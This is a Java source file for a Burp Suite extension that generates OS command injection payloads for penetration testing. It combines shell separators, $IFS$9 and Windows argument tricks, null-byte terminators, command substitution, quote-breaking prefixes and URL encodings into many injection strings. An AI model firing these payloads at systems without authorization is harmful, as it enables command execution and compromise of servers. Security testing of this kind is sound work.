package uk.co.pentest.SHELLING;

import burp.BurpExtender;
import burp.IBurpExtenderCallbacks;
import burp.IIntruderPayloadGenerator;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.swing.ListModel;

/**
 *
 * @author julianh
 */
public final class IntruderPayloadGenerator implements IIntruderPayloadGenerator 
{
    IBurpExtenderCallbacks callbacks = BurpExtender.getBurpCallbacks();
    ShellingTab tab;
    
    int payloadIndex;                   // counter for the getNextPayload and hasMorePayloads methods
    boolean payloadMarking;             // whether or not to use payload marking
    Integer cnt=0;                      // counter for the payload marker    
    String payloadType;                 // cmd or mark

    ArrayList<String> shellings;        // the final payloads
    ArrayList<String> shellings_raw;    // payloads before output encoding  
    ArrayList<String> basePayloads;     // my @BASE_PAYLOADS=($PAYL);
    

    ArrayList<String> argumentSeparators;        // my @ARGUMENT_SEPARATORS=('%20%20',"%09%09");
    ArrayList<String> commandSeparators;         // my @COMMAND_SEPARATORS=('%0a%0a','%26','|');
    ArrayList<String> commandTerminators;        // my @COMMAND_TERMINATORS=("%00",'%F0%9F%92%A9');
    ArrayList<String> nixCommandSeparators;
    ArrayList<String> nixArgumentSeparators;      
    ArrayList<String> nixCommandTerminators;
    ArrayList<String> winCommandSeparators;
    ArrayList<String> winArgumentSeparators;
    ArrayList<String> winEchoArgumentSeparators;
    ArrayList<String> prefixes;
    ArrayList<String> prefixSuffixes;   
    String command;
    String argument;
    String targetOS;
    String payload;                     // the base payload in high level form ({COMMAND}{SEPARATOR}{ARGUMENT})


    public IntruderPayloadGenerator(String payloadType, ShellingTab tab) 
    {
        this.payloadType = payloadType;
        this.tab=tab;
        shellings=new ArrayList<>();
        shellings_raw=new ArrayList<>();
        basePayloads=new ArrayList<>();
        
        argumentSeparators=new ArrayList<>();
        argumentSeparators=new ArrayList<>();
        commandSeparators=new ArrayList<>();         // my @COMMAND_SEPARATORS=('%0a%0a','%26','|');
        commandTerminators=new ArrayList<>();        // my @COMMAND_TERMINATORS=("%00",'%F0%9F%92%A9');
        nixCommandSeparators=new ArrayList<>();
        nixArgumentSeparators=new ArrayList<>();
        nixCommandTerminators=new ArrayList<>();
        winCommandSeparators=new ArrayList<>();
        winArgumentSeparators=new ArrayList<>();
        winEchoArgumentSeparators=new ArrayList<>();
        prefixes=new ArrayList<>();
        prefixSuffixes=new ArrayList<>();
        
        // Collecting user configuration from the panel interface
        //this.prefixes.add(this.tab.shellingPanel.commandPrefixField.getText());          
        this.prefixes.add("PREFIX_HOLDER"); // this will be replaced in a late (getNextPayload() in the IntruderPayloadGenerator) stage by the base payload
        this.prefixSuffixes.add("'");
        this.prefixSuffixes.add("\"");
        if(this.tab.shellingPanel.payloadMarkingBox.isSelected())
        {
            this.payloadMarking=true;
        }
        else
        {
            this.payloadMarking=false;
        }                   
        
        targetOS=this.tab.shellingPanel.targetOS; 
        command=this.tab.shellingPanel.commandField.getText();
        argument=this.tab.shellingPanel.argumentField.getText().trim();
        
        // OK, let's roll
        payload=command+"ARGUMENT_SEPARATOR"+argument;
        
        // let's initiate the building element variables
        // universal argument separators
        this.argumentSeparators.add(" "); // space 
        this.argumentSeparators.add(this.byteToString((byte)0x09)); // 09, horizontal tab
        
        // universal command separators
        this.commandSeparators.add(this.byteToString((byte)0x0a));  // newline
        this.commandSeparators.add("&");                            // ampersand
        this.commandSeparators.add("|");                            // pipe
        
        // command/string terminators
        // this.commandTerminators.add("ðŸ’©");                           // the poo character, this should only work with asynchronous strings entering a mysql database first, should be disabled by default
        this.commandTerminators.add(this.byteToString((byte)0x00));     // nullbyte

        // OS-specific command separators
        // nix-like command separators
        this.nixCommandSeparators.add(";");                             // semicolon
        
        // nic-like argument separators
        this.nixArgumentSeparators.add("$IFS$9");                       // $IFS$9
        
        this.nixCommandTerminators.add(" #");
        
        this.winCommandSeparators.add(this.byteToString((byte)0x1a));
        
        this.winArgumentSeparators.add(this.byteToString((byte)0x0b));
        this.winArgumentSeparators.add("%25ProgramFiles:~10,1%25");
        
        
        this.winEchoArgumentSeparators.add("(");
        this.winEchoArgumentSeparators.add(".");    
        
        this.winCommandSeparators.add(this.byteToString((byte)0x26)+"::");
        
        // let's start building
        basePayloads.add(payload);
        if("nix".equals(targetOS)||"all".equals(targetOS))
        {
            this.basePayloads.add("$("+payload+")");
            this.basePayloads.add("`"+payload+"`");
            this.basePayloads.add("{"+command+","+argument+"}");// the brace operator
            
            for(int i=0;i<this.nixCommandSeparators.size();i++)
            {
                this.commandSeparators.add(this.nixCommandSeparators.get(i));
            }
            for(int i=0;i<this.nixArgumentSeparators.size();i++)
            {
                this.argumentSeparators.add(this.nixArgumentSeparators.get(i));
            } 
        }
        
        if("win".equals(targetOS)||"all".equals(targetOS))
        {        
            for(int i=0;i<this.winCommandSeparators.size();i++)
            {
                this.commandSeparators.add(this.winCommandSeparators.get(i));
            }            
            for(int i=0;i<this.winArgumentSeparators.size();i++)
            {
                this.argumentSeparators.add(this.winArgumentSeparators.get(i));
            } 
            if(command.equals("echo"))          
            {
                for(int i=0;i<this.winEchoArgumentSeparators.size();i++)
                {
                    this.argumentSeparators.add(this.winEchoArgumentSeparators.get(i));
                    this.winArgumentSeparators.add(this.winEchoArgumentSeparators.get(i));
                } 
            }
        }
        
        // automatically prefix prefixes with quotes in order to gain quoted injection compatibility
        ArrayList<String> tmpPrefixes=new ArrayList<>();
        tmpPrefixes=(ArrayList<String>)prefixes.clone();
        for(int i=0;i<tmpPrefixes.size();i++)
        {
            for(int j=0;j<prefixSuffixes.size();j++)
            {
                prefixes.add(tmpPrefixes.get(i)+this.prefixSuffixes.get(j));
            }
        }              
        
        // First, we fill our output payloads list wth all variations of base payloads, including different argument separators
        for(int i=0;i<this.argumentSeparators.size();i++)
        {
           for(int j=0;j<this.basePayloads.size();j++)
           {
               String myCurrPayload=this.basePayloads.get(j);
               if(this.incompatibleTargets(this.argumentSeparators.get(i), myCurrPayload, "separator"))
               {
                   continue; 
               }
               myCurrPayload=myCurrPayload.replace("ARGUMENT_SEPARATOR",this.argumentSeparators.get(i));
               this.shellings_raw.add(myCurrPayload);
           }
        }
        
        this.basePayloads=(ArrayList<String>)this.shellings_raw.clone();   // overwrite the base with different base command_separator variants        
        
        // 2) MALICIOUS_COMMAND+COMMAND_TERMINATOR 
        for(int i=0;i<this.basePayloads.size();i++)
        {
            for(int j=0;j<this.commandTerminators.size();j++)
            {
                if(this.incompatibleTargets(this.commandTerminators.get(j),this.basePayloads.get(i),"terminator"))
                {
                    continue;
                }
                String currPayload=this.basePayloads.get(i)+this.commandTerminators.get(j);
                this.shellings_raw.add(currPayload);
            }
            for(int j=0;j<this.commandSeparators.size();j++)
            {
                if(this.incompatibleTargets(this.commandSeparators.get(j),this.basePayloads.get(i),"separator"))
                {
                    continue;
                }                
               this.shellings_raw.add(this.basePayloads.get(i)+this.commandSeparators.get(j));               
            }
        }
        // 3) COMMAND_SEPARATOR+MALICIOUS_COMMAND
        for(int i=0;i<this.basePayloads.size();i++)
        {
            for(int j=0;j<this.commandSeparators.size();j++)
            {
                if(this.incompatibleTargets(this.commandSeparators.get(j),this.basePayloads.get(i),"separator"))
                {
                    continue;
                }   
                this.shellings_raw.add(this.commandSeparators.get(j)+this.basePayloads.get(i));                
            }
        }
        // 4) COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR
        // I think this makes the above section 3) redundant, because:
        // - if the application is appending our payload with something, 3) will fail, while 4) will work
        // - if the application is not accepting COMMAND_SEPARATOR, both variants will fail, so 3) is not helping anyway
        // - if the application is rejecting values that do not end with alphanum (which is how any of our MALICIOUS_COMMANDS would end), 4) will fail - but this is why we have the + SUFFIX variant - 5) - right?
        for(int i=0;i<this.basePayloads.size();i++)
        {
            for(int j=0;j<this.commandSeparators.size();j++)
            {
                if(this.incompatibleTargets(this.commandSeparators.get(j),this.basePayloads.get(i),"separator"))
                {
                    continue;
                }   
                this.shellings_raw.add(this.commandSeparators.get(j)+this.basePayloads.get(i)+this.commandSeparators.get(j));                
            }
        }
        // 5) COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR+SUFFIX      
        for(int i=0;i<this.basePayloads.size();i++)
        {
            for(int j=0;j<this.commandSeparators.size();j++)
            {
                if(this.incompatibleTargets(this.commandSeparators.get(j),this.basePayloads.get(i),"separator"))
                {
                    continue;
                }   
                for(int k=0;k<this.prefixes.size();k++)
                {
                  String suffix=this.prefixes.get(k);
                  if(suffix=="'"||suffix=="") 
                  {
                      continue; //skip irrelevant payloads                  
                  }                  
                  this.shellings_raw.add(this.commandSeparators.get(j)+this.basePayloads.get(i)+this.commandSeparators.get(j)+suffix);                
                }
            }
        }
        // 6) PREFIX+COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR
        for(int i=0;i<this.basePayloads.size();i++)
        {
            for(int j=0;j<this.commandSeparators.size();j++)
            {
                if(this.incompatibleTargets(this.commandSeparators.get(j),this.basePayloads.get(i),"separator"))
                {
                    continue;
                } 
                for(int k=0;k<this.prefixes.size();k++)
                {
                    String currPayload=this.prefixes.get(k)+this.commandSeparators.get(j)+this.basePayloads.get(i)+this.commandSeparators.get(j);
                    if(currPayload.contains("'"))
                    {
                        currPayload=currPayload+"'";
                    }
                    else if(currPayload.contains("\""))
                    {
                        currPayload=currPayload+"\"";
                    }
                    this.shellings_raw.add(currPayload);
                }
            }
        }
        // 7) PREFIX+COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR+SUFFIX 
        for(int i=0;i<this.basePayloads.size();i++)
        {
            for(int j=0;j<this.commandSeparators.size();j++)
            {
                if(this.incompatibleTargets(this.commandSeparators.get(j),this.basePayloads.get(i),"separator"))
                {
                    continue;
                }   
                for(int k=0;k<this.prefixes.size();k++)
                {
                  String suffix=this.getProperSuffix(this.prefixes.get(k));                 
                  this.shellings_raw.add(this.prefixes.get(k)+this.commandSeparators.get(j)+this.basePayloads.get(i)+this.commandSeparators.get(j)+suffix);                
                }
            }
        }       
        // 8) PREFIX+MALICIOUS_COMMAND+SUFFIX for substitutions - `CMD` and $(CMD) 
        
        
        for(int i=0;i<this.basePayloads.size();i++)
        {
            for(int j=0;j<this.prefixes.size();j++)
            {
                String basePayload=this.basePayloads.get(i);          
                if(!basePayload.startsWith("$")&&!basePayload.startsWith("`"))
                {                   
                    continue;
                }
                String prefix=this.prefixes.get(j);
                String suffix=this.getProperSuffix(prefix);
                this.shellings_raw.add(prefix+basePayload+suffix);
            }
        }                
        // OK, what's left now is the output encoding + payload marking

        // now we have to deal with the output encodings
        List<String> encodings = this.tab.shellingPanel.getEncodeList();
        for(int j=0;j<this.shellings_raw.size();j++)
        {
            for(String encoding : encodings)
            {
                if("None".equals(encoding))
                {                   
                    String outputPayload=this.getMarkedVersion(this.shellings_raw.get(j));
                    this.shellings.add(outputPayload);
                }
                if("URL".equals(encoding))
                {
                   String outputPayload=this.getMarkedVersion(this.shellings_raw.get(j));
                   try {                    
                    this.shellings.add(URLEncoder.encode(outputPayload,StandardCharsets.UTF_8.toString()));
                    } 
                   catch (UnsupportedEncodingException ex) {
                      Logger.getLogger(IntruderPayloadGenerator.class.getName()).log(Level.SEVERE, null, ex);
                    }
                }
                if("Double URL".equals(encoding))
                {
                       String outputPayload=this.getMarkedVersion(this.shellings_raw.get(j));
                       try {                       
                           this.shellings.add(URLEncoder.encode(URLEncoder.encode(outputPayload,StandardCharsets.UTF_8.toString())));
                       } 
                       catch (UnsupportedEncodingException ex) {
                           Logger.getLogger(IntruderPayloadGenerator.class.getName()).log(Level.SEVERE, null, ex);
                       }
                }
            }
        }
   
    }
    private String getMarkedVersion(String payload)
    {        
        cnt++;
        if(this.payloadMarking)
        {
            String replacement=cnt.toString();
            if(payload.contains("$IFS$9")) // if dealing with $IFS$9
            {
                replacement="a"+replacement;
            }   
            payload=payload.replace("PAYLOAD_MARK",replacement);
        }
        else
        {
            payload=payload.replace("PAYLOAD_MARK","");
        }
        return payload;
    }
    private String byteToString(byte inputByte)
    {
        byte[] t = new byte[1];
        t[0]=inputByte;
        return callbacks.getHelpers().bytesToString(t);
    }    
    private boolean arraySearch(String needle, String[] hayStack)
    {
        for(int i=0;i<hayStack.length;i++)
        {
            if(hayStack[i]==needle) return true;
        }
        return false;
    }
    private boolean incompatibleTargets(String entity, String payload, String what)
    {
        if(targetOS!="all") return false; // it's either strictly win or nix - in such case there should be no incompatible elements in the configuration in the first place
        // this might become false if we allow people to play with the the separators themselves (define their own ones)
        // in such case we'll remove this lind and perform the check every time this function is called
        String cmdPattern = command+"(.*)"+argument;
        String separator="";
               
        Pattern pattern = Pattern.compile(cmdPattern);
        Matcher matcher = pattern.matcher(payload);
        if(!matcher.matches())
        {
            separator=matcher.group(1);
        }
        
        // whether the payload seem nix-like
        if(arraySearch(separator,(String[])this.nixArgumentSeparators.toArray())||payload.contains("`")||payload.contains("$"))
        {
            if("separator".equals(what))
            {
                if(arraySearch(entity,(String[])this.winArgumentSeparators.toArray()))
                {
                    return true;
                }
                if(arraySearch(entity,(String[])this.winCommandSeparators.toArray()))
                {
                    return true;
                }               
                return false;
            }
            if("terminator".equals(what))
            {
                if(arraySearch(entity,(String[])this.winCommandSeparators.toArray()))
                {
                    return true;
                }
                return false;
            }
            return false; 
        }
        if(arraySearch(separator,(String[])this.winArgumentSeparators.toArray())) // dealing with windows
        {
            if("separator".equals(what))
            {
                if(arraySearch(entity,(String[])this.nixCommandSeparators.toArray()))
                {
                  return true;   
                }
                if(arraySearch(entity,(String[])this.nixArgumentSeparators.toArray()))
                {
                  return true;   
                }
                return false;
            }
            if("terminator".equals(what))
            {
                if(arraySearch(entity,(String[])this.nixCommandTerminators.toArray()))
                {
                    return true;
                }
                return false;
            }
        }       
        return false;
    }
    private String getProperSuffix(String prefix)
    {
        String suffix=prefix;
        if(prefix.contains("'"))
        {
            suffix=suffix.replace("'","");
            suffix="'"+suffix;
        }
        else if(prefix.contains("\""))
        {
            suffix=suffix.replace("\"","");
            suffix="\""+suffix;
            
        }        
	return suffix;
    }
    @Override
    public boolean hasMorePayloads() 
    {
      return this.payloadIndex < this.shellings.size();      
    }

    @Override
    public byte[] getNextPayload(byte[] baseValue) 
    {                
        byte[] payload  = new byte[0];
        if("mark".equals(this.payloadType))
        {
            payload=callbacks.getHelpers().stringToBytes(Integer.toString(this.payloadIndex));
        }
        if("cmd".equals(this.payloadType))
        {
            // return the path payload
            String p = this.shellings.get(this.payloadIndex);
            if(p.contains("PREFIX_HOLDER"))
            {                
                String base = callbacks.getHelpers().bytesToString(baseValue);
                p=p.replace("PREFIX_HOLDER",base);
            }
            payload = callbacks.getHelpers().stringToBytes(p);           
        }
        this.payloadIndex++; // increase the index
        return payload;
    }
    @Override
    public void reset() 
    {        
        payloadIndex = 0;
    }       
}
